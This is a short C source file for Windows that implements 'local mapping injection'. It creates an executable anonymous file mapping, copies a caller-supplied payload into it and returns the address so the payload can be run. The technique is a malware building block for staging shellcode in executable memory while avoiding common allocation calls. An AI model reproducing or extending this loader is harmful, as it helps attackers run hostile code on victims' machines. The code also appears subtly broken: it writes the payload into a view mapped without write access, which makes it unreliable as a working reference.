#include <Windows.h>
#include "tlhelp32.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>



BOOL localmappinjection(IN PBYTE pPayload,OUT PVOID*ppAddress,IN SIZE_T sPayloadSize) {

	HANDLE hFile = NULL;
	PVOID 	pMapAddress = NULL;

	hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		printf("Can't create file mapping for our target ! ERROR : 0x%lx", GetLastError());
		return FALSE;
	}
	printf("Mapped successfully!\n");
	pMapAddress = MapViewOfFile(hFile, FILE_MAP_READ | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
	if (pMapAddress == NULL) {
		printf("Can't map the payload successfully ! ERROR : 0x%lx \n", GetLastError());
		CloseHandle(hFile);
		return FALSE;
	}
	printf("Map extracted successfully!\n");

	memcpy(pMapAddress, pPayload, sPayloadSize);
	printf("Payload copied successfully!! \n");


	*ppAddress = pMapAddress;
	if (hFile)
		CloseHandle(hFile);
	return TRUE;





}